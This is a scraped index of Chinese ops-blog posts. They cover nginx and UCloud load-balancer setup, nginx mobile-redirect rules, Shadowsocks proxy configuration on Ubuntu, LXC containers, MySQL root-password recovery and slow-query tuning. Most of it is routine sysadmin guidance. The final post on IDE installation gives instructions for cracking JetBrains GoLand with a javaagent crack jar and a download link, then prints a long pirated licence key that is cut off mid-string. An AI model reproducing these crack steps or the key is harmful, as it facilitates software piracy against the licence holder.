nginx做ssl会话卸载, 监听非443端口\nwww2.fenghong.tech 将您重定向的次数过多。 尝试清除 Cookie. ERR_TOO_MANY_REDIRECTS  504网关错误  由于nginx的每个server段的location里均有对ip的访问控制，取消限制或者加入白名单即可:\n 后端配置443端口证书且配置80端口，并且不配置重定向http\u0026ndash;\u0026gt;https。出现以下400报错:  400 Bad Request The plain HTTP request was sent to HTTPS port  最多的一次错误即403权限拒绝，公司内部的权限控制很多，缺少对这方面的敏锐性  首先在nginx.conf的主配置文件里面对ip有访问控制。\n\tallow 10.9.0.0/16; deny all; 其次在test.conf的主机配置文件里面，对ip有访问控制。\n再其次在知道创宇的域名访问里面，对ip有限制。\n多重的权限设置是这次负载均衡踩坑的关键点。\n403 forbidden ULB基于TCP转发的实验 四层转发或者说四层负载均衡就相对容易点。\n创建ULB的负载均衡，这边实验我选择了内网转发，服务监听在内网更加安全点，这里适用场景为公司的后台管理，重要的资产端管理。\n 创建2个vserver，并且选择tcp协议，选择端口为80和443。 分别创建后端服务器，根据真实情况添加，一般后端服务器有2个，当然更多的后端自行创建。 后端服务器配置选择80和443端口。因为是4层转发，所以直接一一对应即可，方法可以选择轮询、源地址、一致性哈希、源地址，可以根据需求进行更改。  vserver的80端口 -----\u0026gt; 后端的realserver的80端口 vserver的443端口 -----\u0026gt; 后端的realserver的443端口 后端lo网卡的配置   “报文转发模式”下，由于用户访问会经ULB直接透传，必须保证访问地址落在后端真实服务节点上，所以要将负载均衡的内/外网IP地址配置在后端服务节点中。\n  内网ULB时，这里的$VIP即为负载均衡器的内网IP地址。外网ULB时，即为负载均衡器的EIP地址。\n  将命令中得到的内容添加进\u0026quot;/etc/sysconfig/network-scripts/ifcfg-lo:1\u0026quot;中，即如下内容：\n  # vim /etc/sysconfig/network-scripts/ifcfg-lo:1 DEVICE=lo:1 IPADDR=$VIP NETMASK=255.255.255.255  启动虚拟网卡  # ifup lo:1 # ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet 10.9.133.26/32 brd 10.9.133.26 scope global lo:1 后端nginx的配置 后端的nginx配置其实不用更改。下面这个例子供参考\nserver { listen 80; server_name wiki.fenghong.tech; root /data/cun_web/rms; allow 10.9.0.0/16; deny all; rewrite ^/(.*)$ https://wiki.fenghong.tech/$1 permanent; location / { proxy_pass http://127.0.0.1:8114; } location =/ { add_header Access-Control-Allow-Origin *; rewrite ^/$ /home/homeIndex last; } if ($http_user_agent ~* \u0026quot;JianKongBao\u0026quot;) { return 403; } access_log /data/logs/nginx/wiki.log main; error_log /data/logs/nginx/wiki_error.log ; } server { listen 443; server_name wiki.fenghong.tech; root /data/cun_web/rms; index index.html; error_page 500 502 503 504 404 403 /50_default; ssl_certificate /etc/nginx/sslkey/_.q.com_bundle.crt; ssl_certificate_key /etc/nginx/sslkey/_.q.com.key; ssl_session_timeout 10m; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ALL:!DH:!EXPORT:!RC4:+HIGH:+MEDIUM:-LOW:!aNULL:!eNULL; ssl_prefer_server_ciphers on; allow 10.9.0.0/16; deny all; location / { proxy_pass http://127.0.0.1:8114; } location =/ { add_header Access-Control-Allow-Origin *; rewrite ^/$ /home/homeIndex last; } if ($http_user_agent ~* \u0026quot;JianKongBao\u0026quot;) { return 403; } access_log /data/logs/nginx/wiki_ssl.log main; error_log /data/logs/nginx/wiki_ssl_error.log ; } 配置到这里也基本结束了。\n域名指向 这里配置域名指向也是一个坑吧。正式上线的情况下，域名只有一个，要刷新dns缓存。\n将自己的域名指向ULB的负载均衡的ip即可。但是也请谨慎.一次DNS缓存引发的惨案.\n","permalink":"https://www.fenghong.tech/blog/ops/loaderbalancerinucloud/","tags":["http","nginx","slb"],"title":"ULB负载均衡踩的坑"},{"categories":["server","nginx"],"contents":"[TOC]\nnginx 多重判断 在Nginx 配置文件里面有简单的条件控制，但并不支持if条件的逻辑与／逻辑或运算 ，并且不支持if的嵌套语法，这就需要换一种方法来做了。\n场景需求： 手机端访问web端的时候，需要跳转至手机端。但是某些页面又不需要跳转。刚好是公司的业务需要吧，所以有了nginx的多重判断 具体代码如下：\nlocation = /web/address { if ($http_user_agent ~* \u0026quot;((MIDP)|(WindowsWechat)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC\\-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT)|(SonyEricsson)|(NEC)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC)|(SED)|(EMOL)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(Opera))\u0026quot; ) { set $ismob 1; } if ( $ismob = 1 ) { rewrite ^/(.*)$ https://m.fenghong.tech/channel/64688 redirect; } if ( $ismob != 1 ) { rewrite ^/(.*)$ https://www.fenghong.tech/home/activity?un=wdxx redirect; } } 附if语法： 语法：if(condition){………} 配置作用域：server,location\n\u0026quot;=\u0026quot;和\u0026quot;\u0026quot;!=\u0026quot;\u0026quot; 变量等于不等于条件 \u0026quot;~\u0026quot; 和\u0026quot;~\u0026quot; 匹配到指定内容是否区分大小写 \u0026quot;!~\u0026quot;和\u0026quot;!~\u0026quot; 匹配到指定内容是否区分大小写 \u0026quot;-f\u0026quot;和\u0026quot;!-f\u0026quot; 检查一个文件是否存在 \u0026quot;-d\u0026quot; 和\u0026quot;!-d\u0026quot; 检查一个目录是否存在 \u0026quot;-e\u0026quot;和\u0026quot;!-e\u0026quot; 检查一个文件，目录，软连接是否存在 \u0026quot;-x\u0026quot;和\u0026quot;!-x\u0026quot; 检查一个是否有执行权限 匹配的内容可以是字符串也可以是一个正则表达式。 如果一个正则表达式包含\u0026quot;}\u0026quot;或者\u0026quot;;\u0026quot;就必须包含在单引号或双引号里面。 参考：  AN SHEN  ","permalink":"https://www.fenghong.tech/blog/ops/nginx-if/","tags":["nginx"],"title":"nginx if 多重判断语句"},{"categories":["server","ops"],"contents":"[TOC]\n摘要：\n 科学上网 lxc容器  系统：Kubuntu 18.04 X86_64\n一键恢复 重装了一次系统或者重装chrome，发现Proxy SwitchyOmega这个软件的配置没有自动保存功能，比较尴尬，只能重新导入，这边只好保存了一下自己的配置文件，安装好Proxy SwitchyOmega,选择import/Export \u0026mdash;-\u0026gt; Restore from online;我这边保存在自己的阿里云上了，路径如下\nhttps://www.fenghong.tech/OmegaOptions.bak 科学上网  服务器安装  服务器安装ssr可以看flyzy github地址:git clone https://github.com/flyzy2005/ss-fly 一键执行命令：./ss-fly/ss-fly.sh -i foobar 5381 -i 指定密码； 5381 端口\n 单用户账户  { \u0026quot;server\u0026quot;:\u0026quot;0.0.0.0\u0026quot;, \u0026quot;server_port\u0026quot;:5381, \u0026quot;local_address\u0026quot;:\u0026quot;127.0.0.1\u0026quot;, \u0026quot;local_port\u0026quot;:1080, \u0026quot;password\u0026quot;:\u0026quot;foobar1\u0026quot;, \u0026quot;timeout\u0026quot;:300, \u0026quot;method\u0026quot;:\u0026quot;aes-256-cfb\u0026quot;, \u0026quot;fast_open\u0026quot;:false }  多用户配置文件  { \u0026quot;server\u0026quot;:\u0026quot;0.0.0.0\u0026quot;, \u0026quot;local_address\u0026quot;: \u0026quot;127.0.0.1\u0026quot;, \u0026quot;local_port\u0026quot;:1080, \u0026quot;port_password\u0026quot;: { \u0026quot;5381\u0026quot;: \u0026quot;foobar\u0026quot;, \u0026quot;5382\u0026quot;: \u0026quot;foobar1\u0026quot;, \u0026quot;5383\u0026quot;: \u0026quot;foobar2\u0026quot;, \u0026quot;5384\u0026quot;: \u0026quot;foobar3\u0026quot; }, \u0026quot;timeout\u0026quot;:300, \u0026quot;method\u0026quot;:\u0026quot;aes-256-cfb\u0026quot;, \u0026quot;fast_open\u0026quot;: false } 表格说明\n   Name 说明     server 服务器地址，填ip或域名   local_address 本地地址   local_port 本地端口，一般1080，可任意   server_port 服务器对外开的端口   password 密码，可以每个服务器端口设置不同密码   port_password server_port + password ，服务器端口加密码的组合   timeout 超时重连   method 默认: “aes-256-cfb”，见 Encryption   fast_open 开启或关闭 TCP_FASTOPEN, 填true / false，需要服务端支持     安装代理  安装shadowsocks,这里不要用系统自带的sudo apt install shadowsocks,下载的不是最新的，不支持加密选项，会报错，这里博主犯错了，习惯了用vim编辑，所以这里我推荐使用。\n$ sudo apt-get install python-pip -y $ sudo apt-get install git -y $ pip install git+https://github.com/shadowsocks/shadowsocks.git@master $ sudo apt-get install vim -y #下载的shadowsocks是最新版，在/home/$user/.local/bin/{ssserver,sslocal} $ sudo echo \u0026quot;export PATH=/home/feng/.local/bin:$PATH\u0026quot; \u0026gt; /etc/profile.d/ss.sh $ . /etc/profile.d/ss.sh $ echo $PATH /home/feng/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin #已经在环境变量里面，所以可以直接运行。  配置文件创建  server字段: 为服务的ip地址\nserver_port字段: 为服务器开启的端口一般设置在1024之后，建议为8810。\n$ sudo vim /etc/shadowsocks.json { \u0026quot;server\u0026quot;: \u0026quot;serverip\u0026quot;, \u0026quot;server_port\u0026quot;: port, \u0026quot;local_address\u0026quot;: \u0026quot;127.0.0.1\u0026quot;, \u0026quot;local_port\u0026quot;: 1080, \u0026quot;timeout\u0026quot;:300, \u0026quot;password\u0026quot;: \u0026quot;password\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;aes-256-cfb\u0026quot;, \u0026quot;fast_open\u0026quot;:false }  启动  $ sudo sslocal -c /etc/shadowsocks.json -d start #sslocal -h 查看帮助 -c CONFIG path to config file -s SERVER_ADDR server address -p SERVER_PORT server port, default: 8388 -b LOCAL_ADDR local binding address, default: 127.0.0.1 -l LOCAL_PORT local port, default: 1080 -k PASSWORD password -m METHOD encryption method, default: aes-256-cfb 默认开机启动 ubuntu18.04默认是systemd管理启动\n以前启动mysql服务:\nsudo service mysqld start 现在：\nsudo systemctl start mariadb.service systemd 默认读取 /etc/systemd/system 下的配置文件，该目录下的文件会链接/lib/systemd/system/下的文件。\n执行 ls /lib/systemd/system 你可以看到有很多启动脚本，其中就有我们需要的 rc.local.service：\n$ cat /lib/systemd/system/rc.local.service # SPDX-License-Identifier: LGPL-2.1+ # # This file is part of systemd. # # systemd is free software; you can redistribute it and/or modify it # under the terms of the GNU Lesser General Public License as published by # the Free Software Foundation; either version 2.1 of the License, or # (at your option) any later version. # This unit gets pulled automatically into multi-user.target by # systemd-rc-local-generator if /etc/rc.local is executable. [Unit] Description=/etc/rc.local Compatibility Documentation=man:systemd-rc-local-generator(8) ConditionFileIsExecutable=/etc/rc.local After=network.target [Service] Type=forking ExecStart=/etc/rc.local start TimeoutSec=0 RemainAfterExit=yes GuessMainPID=no  正常启动文件   [Unit] 段: 启动顺序与依赖关系\n[Service] 段: 启动行为,如何启动，启动类型\n[Install] 段: 定义如何安装这个配置文件，即怎样做到开机启动\n 可以看出，/etc/rc.local 的启动顺序是在网络后面，但是显然它少了 Install 段，也就没有定义如何做到开机启动，所以显然这样配置是无效的。 因此我们就需要在后面帮他加上 [Install] 段:\n[Install] WantedBy=multi-user.target Alias=rc-local.service 这里需要注意一下，ubuntu-18.04 默认是没有 /etc/rc.local 这个文件的，需要自己创建\n$ sudo touch /etc/rc.local 然后把你需要启动脚本写入 /etc/rc.local ，我们不妨写一些测试的脚本放在里面，以便验证脚本是否生效.\n 创建开机启动的软链接,这点也比较关键，systemd 默认读取 /etc/systemd/system 下的配置文件, 所以还需要在 /etc/systemd/system 目录下创建软链接  ln -s /lib/systemd/system/rc.local.service /etc/systemd/system/  开机自动启动shadowsocks  $ sudo vim /etc/rc.local home/feng/.local/bin/sslocal -c /etc/shadowsocks.json -d start  tips，如果上述操作不成功，可以尝试手工启动  $ vim ss.sh #!/bin/bash /usr/bin/sudo $HOME/.local/bin/sslocal -c /etc/shadowsocks.json -d start $ chmod +x ss.sh $ ./ss.sh 输入秘密即可开启 fixfox代理设置  打开firefox浏览器，添加Proxy SwitchyOmega  1.在浏览器里输入about:addons 2.在 Search on addons.mozilla.org里输入 Proxy SwitchyOmega 3.点击Add添加后，有浏览器告诉你如何安装  设置Proxy  #点击已经添加的Proxy SwitchyOmega 1.#点击Profiles下的Proxy Scheme Protocol Server Port (default) SOCKS5\t127.0.0.1 1080 2.#点击Profiles下的auto switch 添加 Rule list rules (Any request matching the rule list below) proxy Default Direct Rule List Config Rule List Format Switchy\tAutoProxy #选择AutoProxy Rule List URL\thttps://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt #设置完后，点击Download Profile Now 3.#点击ACTIONS ----Apply changes 至此设置完成  点击firefox，进行访问，在浏览器右上角点击小圆圈选择auto swith,然后访问google吧  $ tail /var/log/shadowsocks.log INFO: loading config from /etc/shadowsocks/config.json 2018-07-25 21:15:49 INFO starting local at 127.0.0.1:1080 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49532 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49536 2018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49540  chrome代理设置   SwitchyOmega下载github上的chrome的.crx文件.\n进入chrome浏览器，进入拓展管理页面，勾选开发模式，把下载好的crx文件拖入插件区域即可。\n后续可以参照firefox即可。\n 如果拖拽不了.crx文件，请使用下面的命令进入chrome，即可安装\n# /opt/google/chrome/chrome --enable-easy-off-store-extension-install 感谢阅读！\n踏坑学习  安装shadowsocks  sudo apt-get install shadowsocks 后面的操作基本上面进行，依然访问不了\ntail -f /var/log/shadowsocks.log 2018-07-25 22:18:31 INFO clinet connecting denied 这里权限拒绝，是支持的加密方式可能和我的VPS不一样 。安装最新的shadowscoks即可解决问题！\nubuntu-lxc容器创建 sudo apt-get install lxc* #搭建lxc sudo apt-get install yum\t#搭建yum sudo lxc-create -n temp -t centos #创建centos系统主机名为temp。 sudo chroot /var/lib/lxc/temp/rootfs passwd\t#输入root密码 sudo lxc-copy -n temp -N node01\t#fork新的虚拟机以temp为模板。 sudo lxc-ls sudo lxc-ls -f\t#查看容器信息 sudo lxc-start -n node01\t#开启 node01 sudo lxc-console -n node01\t#进入 node01 sudo lxc-ls -f\tssh root@10.0.3.116\t#ssh连接 sudo lxc-info -n node01 sudo lxc-start temp sudo lxc-info -n temp sudo lxc-stop -n node01\t#停止服务 sudo lxc-destroy -n node01\t#销毁容器 ","permalink":"https://www.fenghong.tech/blog/ops/ubuntu-chrome/","tags":["Linux","ubuntu","shadowSocks","chrome","SwitchyOmega"],"title":"use ssr in ubuntu"},{"categories":["mysql"],"contents":"[TOC]\nmysql 数据库密码忘记 一直以来，对于MySQL root密码的忘记，以为只有一种解法-skip-grant-tables。\n问了下群里的大咖，第一反应也是skip-grant-tables。通过搜索引擎简单搜索了下，无论是百度，抑或Google，只要是用中文搜索，首页都是这种解法。可见这种解法在某种程度上已经占据了使用者的心智。下面具体来看看。\nskip-grant-tables的解法 首先，关闭实例\n这里，只能通过kill mysqld进程的方式。\n# ps -ef |grep mysqld root 6220 6171 0 08:14 pts/0 00:00:00 /bin/sh bin/mysqld_safe --defaults-file=my.cnf mysql 6347 6220 0 08:14 pts/0 00:00:01 /usr/local/mysql57/bin/mysqld --defaults-file=my.cnf --basedir=/usr/local/mysql57 --datadir=/usr/local/mysql57/data --plugin-dir=/usr/local/mysql57/lib/plugin --user=mysql --log-error=slowtech.err --pid-file=slowtech.pid --socket=/usr/local/mysql57/data/mysql.sock --port=3307 root 6418 6171 0 08:17 pts/0 00:00:00 grep --color=auto mysqld # kill 6347 或者 kill -9 6220 6347 使用\u0026ndash;skip-grant-tables参数，重启实例\n# bin/mysqld_safe --defaults-file=my.cnf --skip-grant-tables --skip-networking \u0026amp; 设置了该参数，则实例在启动过程中会跳过权限表的加载，这就意味着任何用户都能登录进来，并进行任何操作，相当不安全。\n建议同时添加\u0026ndash;skip-networking参数。其会让实例关闭监听端口，自然也就无法建立TCP连接，而只能通过本地socket进行连接。\nMySQL8.0就是这么做的，在设置了\u0026ndash;skip-grant-tables参数的同时会自动开启\u0026ndash;skip-networking。\n修改密码\n# mysql -S /usr/local/mysql57/data/mysql.sock mysql\u0026gt; update mysql.user set authentication_string=password('123456') where host='localhost' and user='root'; Query OK, 0 rows affected, 1 warning (0.00 sec) Rows matched: 1 Changed: 0 Warnings: 1 mysql\u0026gt; flush privileges; Query OK, 0 rows affected (0.00 sec) 注意：\n这里的update语句针对的是MySQL 5.7的操作，如果是在5.6版本，修改的应该是password字段，而不是authentication_string。\nupdate mysql.user set password=password('123456') where host='localhost' and user='root'; 而在MySQL 8.0.11版本中，这种方式基本不可行，因为其已移除了PASSWORD()函数及不再支持SET PASSWORD \u0026hellip; = PASSWORD (\u0026lsquo;auth_string\u0026rsquo;)语法。\n不难发现，这种方式的可移植性实在太差，三个不同的版本，就先后经历了列名的改变，及命令的不可用。\n下面，介绍另外一种更通用的做法，还是在skip-grant-tables的基础上。\n与上面不同的是，其会先通过flush privileges操作触发权限表的加载，再使用alter user语句修改root用户的密码，如：\n# bin/mysql -S /usr/local/mysql57/data/mysql.sock mysql\u0026gt; alter user 'root'@'localhost' identified by '123'; ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement mysql\u0026gt; flush privileges; Query OK, 0 rows affected (0.00 sec) mysql\u0026gt; alter user 'root'@'localhost' identified by '123'; Query OK, 0 rows affected (0.00 sec) 免密码登录进来后，直接执行alter user操作是不行的，因为此时的权限表还没加载。可先通过flush privileges操作触发权限表的加载，再执行alter user操作。\n需要注意的是，通过alter user修改密码只适用于MySQL5.7和8.0，如果是MySQL 5.6，此处可写成\nupdate mysql.user set password=password('123456') where host='localhost' and user='root'; 更优雅的解法 相对于skip-grant-tables方案，我们来看看另外一种更优雅的解法，其只会重启一次，且基本上不存在安全隐患。\n首先，依旧是关闭实例\n其次，创建一个sql文件\n写上密码修改语句\n# vim init.sql alter user 'root'@'localhost' identified by '123456'; 最后，使用\u0026ndash;init-file参数，启动实例\n# bin/mysqld_safe --defaults-file=my.cnf --init-file=/usr/local/mysql57/init.sql \u0026amp; 实例启动成功后，密码即修改完毕~\n如果mysql实例是通过服务脚本来管理的，除了创建sql文件，整个操作可简化为一步。\n# service mysqld restart --init-file=/usr/local/mysql57/init.sql 注意：该操作只适用于/etc/init.d/mysqld这种服务管理方式，不适用于RHEL 7新推出的systemd。\n","permalink":"https://www.fenghong.tech/blog/mysql/mysql_password/","tags":["mysql","password"],"title":"mysql lost password"},{"categories":["mysql"],"contents":"[TOC]\n优化 SQL 在得知哪些 SQL 是慢查询之后，我们就可以定位到具体的业务接口并针对性的进行优化了。\n首先，你要看是否能在不改变现有业务逻辑的前提下改进查询的速度。一个典型的场景是，你需要查询数据库中是否存在符合某个条件的记录，返回一个布尔值来表示有或者没有，一般用于通知提醒。如果程序员在撰写接口时没把性能放在心上，那么他就有可能写出 SELECT count(*) FROM tbl_xxx WHERE XXXX 这样的查询，当数据量一大时（而且索引不恰当或没有索引）这个查询会相当之慢，但如果改成 SELECT id FROM tbl_xxx WHERE XXXX LIMIT 1 这样来查询，对速度的提升则是巨大的。这个例子并不是我凭空捏造的，最近在实际项目中我就看到了跟这个例子一模一样的场景。\n能够找到上述的通过改变查询方式而又不改变业务逻辑的慢查询是幸运的，因为这些场景往往意味着只需重写 SQL 语句就能带来显著的性能提升，而且稍有经验的程序员在一开始就不会写出能够明显改良的查询语句。在绝大多数情况下，SQL 足够复杂而且难以做任何有价值的改动，这时就需要通过优化索引来提升效率了。\n如何更好的创建数据库索引绝对是一门技术活，我也并不觉得简简单单就能厘得很清楚，很多时候还是得具体 SQL 具体分析，甚至多条 SQL 一起来分析。可以先读一读这篇美团点评技术团队的文章：MySQL索引原理及慢查询优化，更深入的了解则可以阅读《高性能MySQL》一书。引用一下美团点评技术团队文章中提到的几个原则：\n  最左前缀匹配原则，非常重要的原则，mysql会一直向右匹配直到遇到范围查询(\u0026gt;、\u0026lt;、between、like)就停止匹配，比如a = 1 and b = 2 and c \u0026gt; 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整； =和in可以乱序，比如a = 1 and b = 2 and c = 3 建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式； 尽量选择区分度高的列作为索引,区分度的公式是count(distinct col)/count(*)，表示字段不重复的比例，比例越大我们扫描的记录数越少，唯一键的区分度是1，而一些状态、性别字段可能在大数据面前区分度就是0，那可能有人会问，这个比例有什么经验值吗？使用场景不同，这个值也很难确定，一般需要join的字段我们都要求是0.1以上，即平均1条扫描10条记录； 索引列不能参与计算，保持列“干净”，比如from_unixtime(create_time) = ’2014-05-29’就不能使用到索引，原因很简单，b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较，显然成本太大。所以语句应该写成create_time = unix_timestamp(’2014-05-29’); 尽量的扩展索引，不要新建索引。比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。   同步备份  如果是想利用现有的一台SLAVE来做添加一台SLAVE的话，不妨试下下面的方法： 停掉现有的SLAVE 记录下停止时的位置 备份slave 启动slave\n开始新SLAVE change master 的时候用上面记录的位置 （file and pos）\n上述也是我目前的常用做法，不知有何其他高见!\n mysqladmin\n简单一点的\n$ mysqladmin -uroot -p -h127.0.0.1 -P3306 -r -i 1 ext |\\ awk -F\u0026quot;|\u0026quot; '{\\ if($2 ~ /Variable_name/){\\ print \u0026quot; \u0026lt;------------- \u0026quot; strftime(\u0026quot;%H:%M:%S\u0026quot;) \u0026quot; -------------\u0026gt;\u0026quot;;\\ }\\ if($2 ~ /Questions|Queries|Innodb_rows|Com_select |Com_insert |Com_update |Com_delete |Innodb_buffer_pool_read_requests/)\\ print $2 $3;\\ }' 使用awk，复杂一点。\n$ mysqladmin -P3306 -uroot -p -h127.0.0.1 -r -i 1 ext |\\ awk -F\u0026quot;|\u0026quot; \\ \u0026quot;BEGIN{ count=0; }\u0026quot;\\ '{ if($2 ~ /Variable_name/ \u0026amp;\u0026amp; ((++count)%20 == 1)){\\ print \u0026quot;----------|---------|--- MySQL Command Status --|----- Innodb row operation ----|-- Buffer Pool Read --\u0026quot;;\\ print \u0026quot;---Time---|---QPS---|select insert update delete| read inserted updated deleted| logical physical\u0026quot;;\\ }\\ else if ($2 ~ /Queries/){queries=$3;}\\ else if ($2 ~ /Com_select /){com_select=$3;}\\ else if ($2 ~ /Com_insert /){com_insert=$3;}\\ else if ($2 ~ /Com_update /){com_update=$3;}\\ else if ($2 ~ /Com_delete /){com_delete=$3;}\\ else if ($2 ~ /Innodb_rows_read/){innodb_rows_read=$3;}\\ else if ($2 ~ /Innodb_rows_deleted/){innodb_rows_deleted=$3;}\\ else if ($2 ~ /Innodb_rows_inserted/){innodb_rows_inserted=$3;}\\ else if ($2 ~ /Innodb_rows_updated/){innodb_rows_updated=$3;}\\ else if ($2 ~ /Innodb_buffer_pool_read_requests/){innodb_lor=$3;}\\ else if ($2 ~ /Innodb_buffer_pool_reads/){innodb_phr=$3;}\\ else if ($2 ~ /Uptime / \u0026amp;\u0026amp; count \u0026gt;= 2){\\ printf(\u0026quot; %s |%9d\u0026quot;,strftime(\u0026quot;%H:%M:%S\u0026quot;),queries);\\ printf(\u0026quot;|%6d %6d %6d %6d\u0026quot;,com_select,com_insert,com_update,com_delete);\\ printf(\u0026quot;|%6d %8d %7d %7d\u0026quot;,innodb_rows_read,innodb_rows_inserted,innodb_rows_updated,innodb_rows_deleted);\\ printf(\u0026quot;|%10d %11d\\n\u0026quot;,innodb_lor,innodb_phr);\\ }}' mysqldumpslow常用命令 由上面的常用参数就可以组合出如下的常用命令：\nmysqldumpslow -s t slow.log.old \u0026gt; slow.1.dat\t#按照query time排序查看日志 mysqldumpslow -s at slow.log.old \u0026gt; slow.2.dat\t#按照平均query time排序查看日志 mysqldumpslow -a -s at slow.log.old \u0026gt; slow.3.dat\t#按照平均query time排序并且不抽象数字的方式排序 mysqldumpslow -a -s c slow.log.old \u0026gt; slow.4.dat #安装执行次数排序 参考：mysqldumpslow Manual\n","permalink":"https://www.fenghong.tech/blog/mysql/mysql-slow-query/","tags":["mysql","SlowQuery"],"title":"mysql slow query"},{"categories":["tools"],"contents":"[TOC]\nInteliJ IDEA安装 网上的InteliJ IDEA破解安装这里便不赘述了,随便百度了一下，推荐一下这个blog 正版安装详细见官网https://www.jetbrains.com/idea/ 安装好IDEA后，settings里面plugin安装go插件。Settings \u0026mdash;\u0026gt; pulgins \u0026mdash;\u0026gt; Browse repositories \u0026mdash;\u0026gt; 搜索go，安装star最多的即可\ngo安装 下载最新的go版本安装https://golang.org/dl/,win10下载 Installer\tWindows\tx86-64。 开始golang吧！\ngoland idea专门为go开发的一款开发工具蛮好用的~,破解工具链接: https://pan.baidu.com/s/17gPPZpekcscthSzMhd7crQ 提取码: g982,\n在安装的bin目录下找到goland.exe.vmoptions和goland64.exe.vmoptions. -javaagent:C:\\Program Files\\JetBrains\\GoLand 2019.1.3\\bin\\JetbrainsCrack-release-enc.jar ZKVVPH4MIO-eyJsaWNlbnNlSWQiOiJaS1ZWUEg0TUlPIiwibGljZW5zZWVOYW1lIjoi5o6I5p2D5Luj55CG5ZWGIGh0dHA6Ly9pZGVhLmhrLmNuIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTAxIiwicGFpZFVwVG8iOiIyMDIwLTA2LTMwIn0seyJjb2RlIjoiQUMiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTAxIiwicGFpZFVwVG8iOiIyMDIwLTA2LTMwIn0seyJjb2RlIjoiRFBOIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMC0wNi0zMCJ9LHsiY29kZSI6IlBTIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMC0wNi0zMCJ9LHsiY29kZSI6IkdPIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMC0wNi0zMCJ9LHsiY29kZSI6IkRNIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMC0wNi0zMCJ9LHsiY29kZSI6IkNMIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMC0wNi0zMCJ9LHsiY29kZSI6IlJTMCIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJSQyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJSRCIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJQQyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJSTSIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJXUyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJEQyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMDEiLCJwYWlkVXBUbyI6IjIwMjAtMDYtMzAifSx7ImNvZGUiOiJSU1UiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTAxIiwicGFpZFVwVG8iOiIyMDIwLTA2LTMwIn1dLCJoYXNoIjoiMTM1NTgzMjIvMCIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-i/ZK8vfXLX80OFpkhwEo9QxMhsWaOu3SfBmNPup63N0kjM2XBIoR67s8fk0Li45CreS2zQcPZdypLPeyRrdrUYGTw77tkK/kUygxEwRKauqgdJhUs+881TGitcmZvk8obLXjjpv+tZEbV31ee6F